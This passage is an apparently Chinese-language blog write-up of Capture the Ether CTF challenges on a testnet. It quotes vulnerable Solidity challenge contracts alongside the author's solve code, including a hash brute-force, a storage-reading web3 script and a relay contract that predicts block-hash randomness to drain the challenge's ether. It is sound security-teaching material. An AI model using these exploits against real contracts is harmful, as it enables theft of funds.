href="https://faucet.metamask.io/">https://faucet.metamask.io/</a> </p><p>但是这个水龙头我获取不到代币，最后用了 @iczc 的水龙头获取的： <a href="https://faucet.chainflag.org/">ETH Testnet Faucet (chainflag.org)</a></p><h3 id="2-callme"><a href="#2-callme" class="headerlink" title="2. callme"></a>2. callme</h3><p><strong>题目描述</strong></p><p>To complete this challenge, all you need to do is call a function.</p><p>The “Begin Challenge” button will deploy the following contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call the function named <code>callme</code> and then click the “Check Solution” button.</p><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=7ou6MoKmxFQ">Call On Me</a>.</p><p><strong>解题</strong></p><p>题目要让我们部署合约后，调用 <code>callme</code> 这个函数，意思让我们尝试与部署后的合约进行交互。</p><ol><li>部署题目合约， 得到一个 challenge 地址</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png"></a><br>2. 安装 remix-ide 编辑器，或者使用在线的： <a href="https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">Remix - Ethereum IDE</a></p><p>部署题目合约用来交互调用 challenge 的 callme 函数</p><p>部署方法如下</p><ul><li><p>在文件编辑器中， contracts 文件中新建 <code>callme.sol</code>， 内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>转到编译界面，设置编译器版本，然后选择下方的编译</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png"></a></p><ul><li>转到部署界面</li></ul><p>选择 <code>injected web3</code> , 点击部署， 填入 <code>At address</code> , 然后就能调用对应公开方法</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png"></a></p><p>这里有一个需要注意的地方，调用 callme 的时候记得看清楚调用的合约地址， 像图中这个地方其实调用的方法不对。应该在下面还有一个callme</p><h3 id="3-Choose-a-nickname"><a href="#3-Choose-a-nickname" class="headerlink" title="3. Choose a nickname"></a>3. Choose a nickname</h3><p><strong>题目描述</strong></p><p>WARMUP: 200 POINTS</p><p><a href="https://capturetheether.com/challenges/warmup/nickname/#">Begin Challenge</a></p><p>It’s time to set your Capture the Ether nickname! This nickname is how you’ll show up on the <a href="https://capturetheether.com/leaderboard/">leaderboard</a>.</p><p>The <code>CaptureTheEther</code> smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the address <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p><p>Here’s the code for this challenge:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address &#x3D;&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] &#x3D; nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Challenge contract. You don&#39;t need to do anything with this; it just verifies</span><br><span class="line">&#x2F;&#x2F; that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte &#x3D; CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0">Say My Name</a>.</p><p><strong>解题</strong></p><p>题目要求我们设置我们的 <code>nickname</code>, 调用 <code>setNickName</code> 方法即可， 但是这里函数传入的类型为 <code>bytes32</code> , 所以我们需要将我们的我们的 nickname 转为 <code>bytes32</code> ， 我这里使用在线的网站进行转换</p><p><a href="https://www.testcoins.io/str-bytes32">String To Bytes32 Online Converter (testcoins.io)</a></p><p>转完之后， 在 remix-ide 中调用 <code>setNickName</code> 方法</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png"></a></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="1-Guesst-the-number"><a href="#1-Guesst-the-number" class="headerlink" title="1. Guesst the number"></a>1. Guesst the number</h3><p><strong>题目描述</strong></p><p>I’m thinking of a number. All you have to do is guess it.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer &#x3D; 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M">Guessing Games</a>.</p><p><strong>解题</strong></p><p>让我猜 <code>answer</code> 的值是多少， 如果猜对则 <code>tansfer</code> , 代码里的 <code>answer</code> 是写死的 42 ，那么猜 42 即可 。然后代码中要求 <code>msg.value</code>  要求要一个 <code>1 ether</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png"></a></p><h3 id="2-Guess-the-secret-number"><a href="#2-Guess-the-secret-number" class="headerlink" title="2.  Guess the secret number"></a>2.  Guess the secret number</h3><p><strong>题目描述</strong>：</p><p>Putting the answer in the code makes things a little too easy.</p><p>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8">Mr. Roboto</a>.</p><p><strong>解题</strong></p><p>要求 <code>keccak256(n) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code>, n 为用户输入，且 <code>msg.value == 1 ether</code></p><p>n 的值为 uint 8 , 则范围为 0 - 256， 写一个脚本爆破下，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> Web3.keccak(i).hex() == <span class="string">&#x27;0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>        print(i)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="number">170</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>solidity 脚本参考 @0x9k PDF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function guess() public returns(uint8) &#123;</span><br><span class="line">        for (uint8 n &#x3D; 0; n&lt; 255; n++)</span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line"></span><br><span class="line">return n; &#125;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png"></a></p><blockquote><p>PS：  遇到了一个 Python3 Cryptodome 库的 keccak256 和 solidity 跑出来结果不一致的问题<br><a href="https://ethereum.stackexchange.com/questions/30931/python-and-solidity-keccak256-function-gives-different-results">Python and Solidity keccak256 function gives different results </a></p></blockquote><p><strong>参考文档</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.main.html">Web3 API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a></p><h3 id="3-Guess-the-random-number"><a href="#3-Guess-the-random-number" class="headerlink" title="3.   Guess the random number"></a>3.   Guess the random number</h3><p><strong>题目描述：</strong></p><p>This time the number is generated based on a couple fairly random sources.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs">The Random Song</a>.</p><p><strong>解题</strong></p><p>该题与上一个题的区别是， 这个题目的 answer 由 <code>uint8(keccak256(block.blockhash(block.number - 1), now));</code> 计算而得。搜了下相关 api ， 这个代码版本为 0.4.21 ：</p><ul><li><code>block.blockhash()</code> is now <code>blockhash()</code> hash of the given block when <code>blocknumber</code> is one of the 256 most recent blocks; otherwise returns zero</li><li><code>now</code> is <code>block.timestamp</code> : current block number</li><li><code>block.number</code> (<code>uint</code>): current block number</li></ul><p>由于合约的内容都是公开的，因此我们可以在合约对应的 <code>stroge</code> 里找到 number。 这里有几种方案</p><ol><li>用 solidity 写一个交互代码</li><li>用 Python 的 web3 写一个脚本</li></ol><p>我这里使用 web3 写一个交互脚本，由于web3.py 因为自身不会作为一个区块链的节点存在，因此它需要有一个节点用来存取区块链上的资料。一般来说最安全的方式应该是自己使用 geth 或者 parity 来自建节点，不过如果在不想要自建节点的状况时，可以考虑看看 infura 提供的 HTTP 节点服务。</p><p>我这里到 <a href="https://infura.io/dashboard/ethereum/d9f539bb96ba42c083d610b61d9be812/settings">Infura</a> 注册一个账号， 然后获取对应的 API Key</p><p>脚本内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">infura_url = <span class="string">&#x27;https://mainnet.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url)) </span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;XXXX&#x27;</span> <span class="comment"># blockchain address ， 题目部署后的地址</span></span><br><span class="line">a = web3.eth.getStorageAt(address, <span class="number">1</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p><strong>参考资料</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getStorageAt#web3.eth.Eth.getStorageAt">web3.eth API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a><br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347">Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-i-4e0b40687efd">Let’s Play — Capture the Ether : Lotteries (Part I) | by Forest Fang | Medium</a><br><a href="https://developer.51cto.com/article/706745.html">通过 web3.py 用 Python 存取 Ethereum-51CTO.COM</a></p><h3 id="4-Guess-the-new-number"><a href="#4-Guess-the-new-number" class="headerlink" title="4. Guess the new number"></a>4. Guess the new number</h3><p><strong>题目描述：</strong></p><p>The number is now generated on-demand when a guess is made.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc">I Guess It’s Christmas Time</a>.</p><p><strong>题解：</strong></p><p>这个题目的随机数是在 guess 函数调用的时候生成的。 即题目描述中 的 <em>generated on-demand when a guess is made</em> , 因此我们没法直接获取改随机值。仔细阅读代码我们发现， <code>answer</code> 由代码 <code>uint8(keccak256( block.blockhash(block.number - 1), now));</code> 生成 。通过查阅相关资料我们发现：</p><blockquote><p><strong>block.blockhash(block.number-1)</strong></p><p>有一些合约则基于负一高度区块区块哈希来产生伪随机数，这也是有缺陷的。攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。</p><p>示例：&lt; <a href="https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8">https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8</a>&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Generate random number between 0 &amp; maxuint256 constant private FACTOR &#x3D;  1157920892373161954235709850086879078532699846656405640394575840079131296399;function rand(uint max) constant private returns (uint256 result)&#123;  uint256 factor &#x3D; FACTOR * 100 &#x2F; max;  uint256 lastBlockNumber &#x3D; block.number - 1;  uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));  return uint256((uint256(hashVal) &#x2F; factor)) % max;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>因此我们只需要写一个中继合约，通过中继合约调用目标合约的相关函数，即可。中继合约需要用到 <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces">Interfaces)</a>  利用代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface GuessTheNewNumberSolve &#123;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberSolver &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function GuessTheNewNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address _challengeAddress) public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberSolve challenge &#x3D; GuessTheNewNumberSolve(_challengeAddress);</span><br><span class="line">        challenge.guess.value(msg.value)(answer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 remix 中部署该合约代码， 并调用 <code>solve</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png"></a></p><p><strong>参考资料</strong><br><a href="https://www.freebuf.com/vuls/179173.html">以太坊智能合约中随机数预测 - FreeBuf网络安全行业门户</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">Let’s Play — Capture the Ether : Lotteries (Part II) </a></p><h3 id="5-Predict-the-future"><a href="#5-Predict-the-future" class="headerlink" title="5.  Predict the future"></a>5.  Predict the future</h3><p><strong>题目描述：</strong></p><p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p><p>Note that it is indeed possible to solve this challenge without losing any ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; n;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解题：</strong></p><p>， 题目要求先通过 <code>lockInGuess</code> 下注， 然后调用 <code>settle</code> 开奖。 由于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure><p>这部分代码的存在，我们无法直接通过预测来解决这个题目。 但是由于 <code>answer</code> 范围为 0 - 9， 我们可以先 lock 一个值， 然后当觉得时机合适的，即 <code>answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</code>  的时候，我们再调用 <code>settle</code> 。</p><ol><li>首先编写一个中继合约， 合约内容要能调用 challenge 的 lock 以及<code>settle</code>， 在合约中调用 settle 前要判断下是否时机符合</li><li>编写一个 web3 脚本， 来调用中继合约的判断函数， 当 challenge 的 <code>isComplete</code> 已经被调用后， 就退出脚本</li></ol><p>PS: 编写 web3 python3 脚本所需要的 API JSON 可在 Remix 中导出。</p><p><strong>code：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 